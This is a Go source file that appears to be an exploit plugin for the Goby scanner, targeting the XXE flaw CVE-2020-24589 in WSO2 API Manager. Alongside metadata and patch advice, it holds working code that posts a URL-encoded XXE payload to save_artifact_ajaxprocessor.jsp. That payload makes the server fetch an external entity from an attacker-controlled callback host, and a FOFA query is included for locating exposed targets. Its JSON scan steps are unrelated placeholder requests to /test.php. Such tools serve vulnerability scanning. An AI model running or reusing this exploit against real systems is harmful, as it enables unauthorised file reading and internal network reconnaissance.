package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "WSO2 API Manager save_artifact_ajaxprocessor.jsp XXE Vulnerability (CVE-2020-24589)",
    "Description": "<p>WSO2 API Manager is a set of API lifecycle management solutions from WSO2 in the United States.</p><p>A vulnerability exists in WSO2 API Manager. The following products and versions are affected: WSO2 API Manager from version 3.1.0 and API Microgateway version 2.2.0, the attacker can read arbitrary files and detect intranet information, etc.</p>",
    "Product": "WSO2-Carbon-Server",
    "Homepage": "https://wso2.com/",
    "DisclosureDate": "2023-01-12",
    "Author": "corp0ra1",
    "FofaQuery": "title=\"WSO2\" || header=\"Server: WSO2 Carbon Server\" || banner=\"Server: WSO2 Carbon Server\"",
    "GobyQuery": "title=\"WSO2\" || header=\"Server: WSO2 Carbon Server\" || banner=\"Server: WSO2 Carbon Server\"",
    "Level": "2",
    "Impact": "<p>A vulnerability exists in WSO2 API Manager. The following products and versions are affected: WSO2 API Manager from version 3.1.0 and API Microgateway version 2.2.0, the attacker can read arbitrary files and detect intranet information, etc.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please visit the manufacturer's homepage: <a href=\"https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0742\">https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0742</a></p>",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2020-24589"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "dnslog",
            "type": "input",
            "value": "http://yourip",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "XML External Entity Injection"
    ],
    "VulType": [
        "XML External Entity Injection"
    ],
    "CVEIDs": [
        "CVE-2020-24589"
    ],
    "CNNVD": [
        "CNNVD-202008-1088"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.1",
    "Translation": {
        "CN": {
            "Name": "WSO2 API Manager 系统 save_artifact_ajaxprocessor.jsp XXE 漏洞（CVE-2020-24589）",
            "Product": "WSO2-Carbon-Server",
            "Description": "<p>WSO2 API Manager是美国WSO2公司的一套API生命周期管理解决方案。<br></p><p>WSO2 API Manager中存在漏洞。以下产品及版本受到影响：WSO2 API Manager从3.1.0 开始版本和 API Microgateway 2.2.0版本，攻击者可读取任意文件和探测内网信息等。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href=\"https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0742\">https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0742</a><br></p>",
            "Impact": "<p>WSO2 API Manager中存在漏洞。以下产品及版本受到影响：WSO2 API Manager从3.1.0 开始版本和 API Microgateway 2.2.0版本，攻击者可读取任意文件和探测内网信息等。<br></p>",
            "VulType": [
                "XML外部实体注入"
            ],
            "Tags": [
                "XML外部实体注入"
            ]
        },
        "EN": {
            "Name": "WSO2 API Manager save_artifact_ajaxprocessor.jsp XXE Vulnerability (CVE-2020-24589)",
            "Product": "WSO2-Carbon-Server",
            "Description": "<p>WSO2 API Manager is a set of API lifecycle management solutions from WSO2 in the United States.<br></p><p>A vulnerability exists in WSO2 API Manager. The following products and versions are affected: WSO2 API Manager from version 3.1.0 and API Microgateway version 2.2.0, the attacker can read arbitrary files and detect intranet information, etc.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please visit the manufacturer's homepage: <a href=\"https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0742\">https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0742</a><br></p>",
            "Impact": "<p>A vulnerability exists in WSO2 API Manager. The following products and versions are affected: WSO2 API Manager from version 3.1.0 and API Microgateway version 2.2.0, the attacker can read arbitrary files and detect intranet information, etc.<br></p>",
            "VulType": [
                "XML External Entity Injection"
            ],
            "Tags": [
                "XML External Entity Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10708"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			if strings.Contains(checkUrl,"http://"){
				checkUrl = strings.ReplaceAll(checkUrl,"http://","")
			}

			uri := "/carbon/generic/save_artifact_ajaxprocessor.jsp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("payload=<%%3fxml+version%%3d\"1.0\"+%%3f><!DOCTYPE+a+[+<!ENTITY+%%25+xxe+SYSTEM+\"http%%3a//%s\">%%25xxe%%3b]>", checkUrl)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody,"Failed to install the generic artifact type"){
				return godclient.PullExists(checkStr, time.Second*10)
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["dnslog"].(string)
			uri := "/carbon/generic/save_artifact_ajaxprocessor.jsp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("payload=<%%3fxml+version%%3d\"1.0\"+%%3f><!DOCTYPE+a+[+<!ENTITY+%%25+xxe+SYSTEM+\"%s\">%%25xxe%%3b]>", cmd)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody,"Failed to install the generic artifact type") {
				expResult.Output = "命令已执行"
				expResult.Success = true
			}
			return expResult
		},
	))
}
